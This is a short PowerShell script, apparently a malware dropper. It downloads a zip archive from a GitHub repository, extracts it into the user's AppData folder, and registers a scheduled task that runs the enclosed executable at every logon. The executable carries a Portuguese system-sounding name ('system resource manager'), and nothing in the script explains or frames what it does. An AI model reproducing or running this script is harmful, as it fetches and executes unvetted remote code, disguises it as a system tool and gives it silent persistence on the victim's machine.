Invoke-RestMethod "https://github.com/n0shadow/config/raw/refs/heads/main/Server.zip" -OutFile "a.zip";
Expand-Archive -Path "a.zip" -DestinationPath ".";
Remove-Item "a.zip";

$usrPath = $PWD.Path
$usr = Split-Path $usrPath -Leaf
$dest = Join-Path $usrPath "AppData\Local\Server"
$exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"
Move-Item "Server" $dest -Force

$tsk = "GerenciadorRecursos"

schtasks.exe /create `
    /tn $tsk `
    /tr "'$exec'" `
    /sc onlogon `
    /ru "$usr" `
    /rl limited
